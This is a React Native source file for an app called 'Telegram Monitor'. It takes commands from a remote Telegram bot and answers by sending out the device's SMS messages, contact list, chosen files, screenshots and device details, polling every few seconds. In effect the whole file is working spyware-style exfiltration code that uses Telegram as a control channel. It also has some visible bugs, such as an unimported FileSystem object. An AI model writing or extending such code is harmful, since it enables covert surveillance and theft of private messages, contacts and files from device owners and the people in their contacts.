/**
 * Telegram Monitor - Enhanced
 * A React Native application for remote device monitoring via Telegram Bot
 */
import React, { useState, useEffect, useCallback } from "react";
import {
  View,
  Text,
  StyleSheet,
  StatusBar as RNStatusBar,
  SafeAreaView,
  ScrollView,
  TouchableOpacity,
  Animated,
  KeyboardAvoidingView,
  Platform,
  AppState,
} from "react-native";
import { Ionicons } from "@expo/vector-icons";

// Services and Utilities
import telegramAPI from "./src/api/telegramAPI";
import logger from "./src/utils/logger";
import * as storage from "./src/utils/storage";

// Hooks
import useDeviceInfo from "./src/hooks/useDeviceInfo";
import useFileSystem from "./src/hooks/useFileSystem";
import usePermissions from "./src/hooks/usePermissions";
import useMessageService from "./src/hooks/useMessageService";

// Services
import contactsService from "./src/services/contactsService";
import deviceService from "./src/services/deviceService";
import fileService from "./src/services/fileService";
import messageService from "./src/services/messageService";

// Components
import ConsoleLog from "./src/components/ConsoleLog";
import ConnectionStatus from "./src/components/ConnectionStatus";
import SettingsForm from "./src/components/SettingsForm";
import StatusBar from "./src/components/StatusBar";

export default function App() {
  // State
  const [isConnected, setIsConnected] = useState(false);
  const [processing, setProcessing] = useState(false);
  const [monitoringActive, setMonitoringActive] = useState(false);
  const [lastUpdateTime, setLastUpdateTime] = useState(null);
  const [appState, setAppState] = useState(AppState.currentState);
  const [updateInterval, setUpdateInterval] = useState(null);
  const [showSettings, setShowSettings] = useState(true);

  // Custom hooks
  const { deviceInfo, refreshDeviceInfo } = useDeviceInfo();
  const { currentPath, fileList, listFiles, navigateTo, navigateBack } =
    useFileSystem();
  const { permissionStatus, requestAllPermissions } = usePermissions();
  const { 
    isAvailable: smsAvailable, 
    hasPermission: smsPermissionGranted,
    getSmsMessages,
    getSmsThreads,
    getThreadMessages,
    formatSmsAsCSV,
    formatSmsAsText
  } = useMessageService();

  // Animation refs
  const fadeAnim = React.useRef(new Animated.Value(0)).current;
  const scanLineAnim = React.useRef(new Animated.Value(0)).current;

  // Initialize app
  useEffect(() => {
    const initialize = async () => {
      logger.info("Application starting...");

      // Start animations
      Animated.loop(
        Animated.timing(fadeAnim, {
          toValue: 1,
          duration: 1500,
          useNativeDriver: true,
        }),
      ).start();

      Animated.loop(
        Animated.sequence([
          Animated.timing(scanLineAnim, {
            toValue: 1,
            duration: 2000,
            useNativeDriver: true,
          }),
          Animated.timing(scanLineAnim, {
            toValue: 0,
            duration: 0,
            useNativeDriver: true,
          }),
        ]),
      ).start();

      // Check for saved credentials
      const savedToken = await storage.getBotToken();
      const savedChatId = await storage.getChatId();

      if (savedToken && savedChatId) {
        logger.info("Found saved credentials, initializing connection...");
        const success = telegramAPI.initialize(savedToken, savedChatId);

        if (success) {
          setIsConnected(true);
          setShowSettings(false);
          logger.success("Connected to Telegram with saved credentials");
        } else {
          logger.warning("Could not connect with saved credentials");
        }
      } else {
        logger.info("No saved credentials found");
      }

      // Request permissions
      await requestAllPermissions();
    };

    initialize();

    // Set up AppState listener
    const handleAppStateChange = (nextAppState) => {
      if (appState.match(/inactive|background/) && nextAppState === "active") {
        logger.info("App has come to the foreground!");
        refreshDeviceInfo();
      }

      setAppState(nextAppState);
    };

    const subscription = AppState.addEventListener(
      "change",
      handleAppStateChange,
    );

    return () => {
      subscription.remove();
    };
  }, []);

  // Handle connection status changes
  useEffect(() => {
    const handleConnectionChange = (connected) => {
      setIsConnected(connected);
      if (connected) {
        startMonitoring();
      } else {
        stopMonitoring();
      }
    };

    telegramAPI.addConnectionListener(handleConnectionChange);

    return () => {
      telegramAPI.removeConnectionListener(handleConnectionChange);
    };
  }, []);

  // Set up Telegram command handlers
  useEffect(() => {
    // Register command handlers
    telegramAPI.registerCommandHandler("call_logs", handleCallLogs);
    telegramAPI.registerCommandHandler("sms_logs", handleSmsLogs);
    telegramAPI.registerCommandHandler("contacts", handleContacts);
    telegramAPI.registerCommandHandler("storage", handleStorage);
    telegramAPI.registerCommandHandler("device_info", handleDeviceInfo);
    telegramAPI.registerCommandHandler("screenshot", handleScreenshot);
    telegramAPI.registerCommandHandler("file", handleFile);
    telegramAPI.registerCommandHandler("back", handleNavigateBack);

    return () => {
      // Nothing to do on cleanup - the API instance persists
    };
  }, [currentPath, fileList]);

  // Telegram update polling
  const startMonitoring = useCallback(() => {
    if (updateInterval) {
      clearInterval(updateInterval);
    }

    // Set up periodic polling if connected
    if (isConnected) {
      const interval = setInterval(checkTelegramUpdates, 3000);
      setUpdateInterval(interval);
      setMonitoringActive(true);
      logger.info("Monitoring started");

      // Send initial device info
      sendDeviceInfo();
    }

    return () => {
      if (updateInterval) {
        clearInterval(updateInterval);
      }
    };
  }, [isConnected, updateInterval]);

  const stopMonitoring = useCallback(() => {
    if (updateInterval) {
      clearInterval(updateInterval);
      setUpdateInterval(null);
    }

    setMonitoringActive(false);
    logger.info("Monitoring stopped");
  }, [updateInterval]);

  // Handle connect button press
  const handleConnect = useCallback(
    (token, chatId) => {
      setIsConnected(true);
      setShowSettings(false);
      startMonitoring();
    },
    [startMonitoring],
  );

  // Check for new Telegram updates
  const checkTelegramUpdates = useCallback(async () => {
    if (processing || !isConnected) return;

    try {
      setProcessing(true);
      const updates = await telegramAPI.getUpdates();

      if (updates.length > 0) {
        setLastUpdateTime(new Date());
        logger.info(`Received ${updates.length} updates from Telegram`);

        // Process each update
        for (const update of updates) {
          await telegramAPI.processUpdate(update);
        }
      }
    } catch (error) {
      logger.error(`Update error: ${error.message}`);
    } finally {
      setProcessing(false);
    }
  }, [processing, isConnected]);

  // Send device information to Telegram
  const sendDeviceInfo = useCallback(async () => {
    try {
      await refreshDeviceInfo();
      const success = await telegramAPI.sendDeviceInfo(deviceInfo);

      if (success) {
        logger.success("Device info sent to Telegram");
      } else {
        logger.error("Failed to send device info");
      }
    } catch (error) {
      logger.error(`Send device info error: ${error.message}`);
    }
  }, [deviceInfo, refreshDeviceInfo]);

  // Command handlers
  const handleCallLogs = useCallback(async () => {
    try {
      logger.info("Call logs requested");

      // This is not supported in Expo
      await telegramAPI.sendMessage(
        "Call log access requires native Android modules. Not available in this version.",
      );

      logger.warning("Call log access not available in Expo");
    } catch (error) {
      logger.error(`Call logs error: ${error.message}`);
    }
  }, []);

  const handleSmsLogs = useCallback(async () => {
    try {
      logger.info("SMS logs requested");

      if (!smsAvailable) {
        await telegramAPI.sendMessage(
          "SMS functionality is not available on this device.",
        );
        logger.warning("SMS not available on this device");
        return;
      }

      if (!smsPermissionGranted) {
        await telegramAPI.sendMessage(
          "SMS permission not granted. Please grant permission in the app settings.",
        );
        logger.warning("SMS permission denied");
        return;
      }

      // Get real SMS messages using the native module integration
      const messages = await getSmsMessages({
        maxCount: 100,
        includeInbox: true,
        includeSent: true
      });

      if (!messages || messages.length === 0) {
        await telegramAPI.sendMessage("No SMS messages found on this device.");
        logger.info("No SMS messages found");
        return;
      }

      // Format as CSV and send
      const csvPath = await formatSmsAsCSV(messages);

      if (csvPath) {
        await telegramAPI.sendFile(csvPath, `SMS Messages Export (${messages.length} messages)`);
        
        // Also send a text sample of the most recent messages
        await telegramAPI.sendMessage(
          `Found ${messages.length} SMS messages.\n\nRecent messages sample:\n\n${formatSmsAsText(messages.slice(0, 5))}`
        );
        
        logger.success(`SMS logs sent successfully (${messages.length} messages)`);
      } else {
        await telegramAPI.sendMessage("Failed to generate SMS logs.");
        logger.error("Failed to generate SMS logs");
      }
    } catch (error) {
      logger.error(`SMS logs error: ${error.message}`);
      await telegramAPI.sendMessage(`Error accessing SMS: ${error.message}`);
    }
  }, [smsAvailable, smsPermissionGranted, getSmsMessages, formatSmsAsCSV, formatSmsAsText]);

  const handleContacts = useCallback(async () => {
    try {
      logger.info("Contacts requested");

      // Check if contacts permission is granted
      const { status } = await contactsService.getAllContacts();

      if (status !== "granted") {
        await telegramAPI.sendMessage(
          "Contacts permission not granted. Cannot access contacts.",
        );
        logger.warning("Contacts permission denied");
        return;
      }

      // Get all contacts
      const contacts = await contactsService.getAllContacts();

      if (!contacts || contacts.length === 0) {
        await telegramAPI.sendMessage("No contacts found on this device.");
        logger.info("No contacts found");
        return;
      }

      // Convert to CSV and send
      const csv = contactsService.contactsToCSV(contacts);
      const csvPath = await fileService.createTempFile(csv, "contacts.csv");

      await telegramAPI.sendFile(
        csvPath,
        `Contacts: ${contacts.length} entries`,
      );

      // Also send a summary of the first few contacts
      const summary = contacts
        .slice(0, 5)
        .map((c) => contactsService.formatContact(c))
        .join("\n\n-----------------\n\n");

      await telegramAPI.sendMessage(
        `Found ${contacts.length} contacts.\n\nSample contacts:\n\n${summary}`,
      );

      logger.success("Contacts sent successfully");
    } catch (error) {
      logger.error(`Contacts error: ${error.message}`);
      await telegramAPI.sendMessage(
        `Error accessing contacts: ${error.message}`,
      );
    }
  }, []);

  const handleStorage = useCallback(async () => {
    try {
      logger.info("Storage access requested");

      // List files in the current path
      const files = await listFiles(currentPath);

      // Create inline keyboard for file selection
      const keyboard = {
        inline_keyboard: [
          ...files.slice(0, 10).map((file, index) => [
            {
              text: `${index + 1}. ${file.name}${file.isDirectory ? "/" : ""}`,
              callback_data: `file_${file.path}`,
            },
          ]),
        ],
      };

      // Add navigation buttons
      keyboard.inline_keyboard.push([
        { text: "🔙 Back", callback_data: "back" },
        { text: "🔄 Refresh", callback_data: "storage" },
      ]);

      // Send message with file list
      await telegramAPI.sendMessage(
        `📂 *Current Directory*: \`${currentPath}\`\n\n` +
          `Found ${files.length} items.\n` +
          `${files.length > 10 ? "Showing first 10 items." : ""}`,
        { reply_markup: keyboard },
      );

      logger.success(`Sent file list for path: ${currentPath}`);
    } catch (error) {
      logger.error(`Storage error: ${error.message}`);
      await telegramAPI.sendMessage(
        `Error accessing storage: ${error.message}`,
      );
    }
  }, [currentPath, listFiles]);

  const handleFile = useCallback(
    async (query, filePath) => {
      try {
        logger.info(`File selected: ${filePath}`);

        // Get file info
        const fileInfo = await FileSystem.getInfoAsync(filePath);

        if (!fileInfo.exists) {
          await telegramAPI.sendMessage(`File not found: ${filePath}`);
          logger.warning(`File not found: ${filePath}`);
          return;
        }

        if (fileInfo.isDirectory) {
          // Navigate to this directory
          await navigateTo(filePath);
          await handleStorage();
        } else {
          // Check file size
          if (fileInfo.size > 50 * 1024 * 1024) {
            // 50MB limit
            await telegramAPI.sendMessage(
              `File too large to send: ${(fileInfo.size / 1024 / 1024).toFixed(2)} MB.\n` +
                `Maximum size is 50 MB.`,
            );
            logger.warning(
              `File too large: ${filePath} (${fileInfo.size} bytes)`,
            );
            return;
          }

          // Send the file
          await telegramAPI.sendFile(
            filePath,
            `File: ${filePath.split("/").pop()}\nSize: ${(fileInfo.size / 1024).toFixed(2)} KB`,
          );

          logger.success(`File sent: ${filePath}`);
        }
      } catch (error) {
        logger.error(`File handling error: ${error.message}`);
        await telegramAPI.sendMessage(`Error accessing file: ${error.message}`);
      }
    },
    [navigateTo, handleStorage],
  );

  const handleNavigateBack = useCallback(async () => {
    try {
      logger.info("Navigate back requested");
      await navigateBack();
      await handleStorage();
    } catch (error) {
      logger.error(`Navigate back error: ${error.message}`);
      await telegramAPI.sendMessage(`Navigation error: ${error.message}`);
    }
  }, [navigateBack, handleStorage]);

  const handleDeviceInfo = useCallback(async () => {
    try {
      logger.info("Device info requested");

      // Refresh device info
      await refreshDeviceInfo();

      // Send formatted device info
      await telegramAPI.sendMessage(deviceService.formatDeviceInfo(deviceInfo));

      logger.success("Device info sent");
    } catch (error) {
      logger.error(`Device info error: ${error.message}`);
      await telegramAPI.sendMessage(
        `Error getting device info: ${error.message}`,
      );
    }
  }, [deviceInfo, refreshDeviceInfo]);

  const handleScreenshot = useCallback(async () => {
    try {
      logger.info("Screenshot requested");

      // Use our native module integration for screenshots
      const screenshotPath = await deviceService.takeScreenshot();
      
      if (screenshotPath) {
        // Send the screenshot to the Telegram chat
        await telegramAPI.sendFile(
          screenshotPath,
          `Screenshot taken at ${new Date().toLocaleString()}`
        );
        logger.success("Screenshot sent successfully");
      } else {
        // If screenshot failed, send an error message
        await telegramAPI.sendMessage(
          "Could not take a screenshot. This might be due to permission restrictions or device limitations."
        );
        logger.warning("Screenshot functionality failed");
      }
    } catch (error) {
      logger.error(`Screenshot error: ${error.message}`);
      
      // Send a more user-friendly error message
      if (error.message.includes("placeholder")) {
        // This is specifically for web/demo environment
        await telegramAPI.sendMessage(
          "Screenshot functionality is available in the native Android app only.\n" +
          "Not available in web preview."
        );
      } else {
        await telegramAPI.sendMessage(`Screenshot error: ${error.message}`);
      }
    }
  }, []);

  return (
    <SafeAreaView style={styles.safeArea}>
      <RNStatusBar barStyle="light-content" backgroundColor="#000" />

      <KeyboardAvoidingView
        behavior={Platform.OS === "ios" ? "padding" : "height"}
        style={styles.container}
      >
        <View style={styles.background}>
          {/* Scan line animation */}
          <Animated.View
            style={[
              styles.scanLine,
              {
                transform: [
                  {
                    translateY: scanLineAnim.interpolate({
                      inputRange: [0, 1],
                      outputRange: [0, 500],
                    }),
                  },
                ],
              },
            ]}
          />

          <View style={styles.content}>
            {/* Header */}
            <View style={styles.header}>
              <Animated.Text style={[styles.title, { opacity: fadeAnim }]}>
                TELEGRAM MONITOR
              </Animated.Text>

              <TouchableOpacity
                style={styles.settingsButton}
                onPress={() => setShowSettings(!showSettings)}
              >
                <Ionicons name="settings-outline" size={24} color="#fff" />
              </TouchableOpacity>
            </View>

            {/* Status Bar */}
            <StatusBar
              deviceInfo={deviceInfo}
              isConnected={isConnected}
              processingStatus={processing}
              monitoringActive={monitoringActive}
              lastUpdateTime={lastUpdateTime}
            />

            {/* Settings Form (collapsible) */}
            {showSettings && <SettingsForm onConnect={handleConnect} />}

            {/* Console Log */}
            <ConsoleLog maxHeight={300} />

            {/* Connection Controls */}
            <View style={styles.controls}>
              <TouchableOpacity
                style={[
                  styles.controlButton,
                  monitoringActive ? styles.stopButton : styles.startButton,
                ]}
                onPress={monitoringActive ? stopMonitoring : startMonitoring}
                disabled={!isConnected}
              >
                <Ionicons
                  name={monitoringActive ? "stop-circle" : "play-circle"}
                  size={20}
                  color="#fff"
                />
                <Text style={styles.buttonText}>
                  {monitoringActive ? "Stop Monitoring" : "Start Monitoring"}
                </Text>
              </TouchableOpacity>

              <TouchableOpacity
                style={styles.controlButton}
                onPress={sendDeviceInfo}
                disabled={!isConnected}
              >
                <Ionicons name="refresh-circle" size={20} color="#fff" />
                <Text style={styles.buttonText}>Send Device Info</Text>
              </TouchableOpacity>
            </View>
          </View>
        </View>
      </KeyboardAvoidingView>
    </SafeAreaView>
  );
}

const styles = StyleSheet.create({
  safeArea: {
    flex: 1,
    backgroundColor: "#000",
  },
  container: {
    flex: 1,
    backgroundColor: "#000",
  },
  background: {
    flex: 1,
    backgroundColor: "#111",
    position: "relative",
    overflow: "hidden",
  },
  scanLine: {
    position: "absolute",
    left: 0,
    right: 0,
    height: 2,
    backgroundColor: "rgba(0, 255, 0, 0.5)",
    zIndex: 1,
  },
  content: {
    flex: 1,
    paddingHorizontal: 16,
    paddingTop: 20,
  },
  header: {
    flexDirection: "row",
    justifyContent: "space-between",
    alignItems: "center",
    marginBottom: 16,
  },
  title: {
    color: "#0f0",
    fontSize: 24,
    fontWeight: "bold",
    fontFamily: Platform.OS === "ios" ? "Courier" : "monospace",
  },
  settingsButton: {
    padding: 8,
  },
  connectionStatus: {
    flexDirection: "row",
    alignItems: "center",
    padding: 8,
    backgroundColor: "#222",
    borderRadius: 5,
  },
  statusText: {
    color: "#fff",
    marginLeft: 8,
    fontSize: 14,
    fontWeight: "bold",
  },
  controls: {
    flexDirection: "row",
    justifyContent: "space-between",
    marginVertical: 16,
  },
  controlButton: {
    flex: 1,
    backgroundColor: "#007bff",
    borderRadius: 5,
    paddingVertical: 12,
    flexDirection: "row",
    justifyContent: "center",
    alignItems: "center",
    marginHorizontal: 5,
  },
  startButton: {
    backgroundColor: "#28a745",
  },
  stopButton: {
    backgroundColor: "#dc3545",
  },
  buttonText: {
    color: "#fff",
    fontWeight: "bold",
    marginLeft: 8,
  },
});
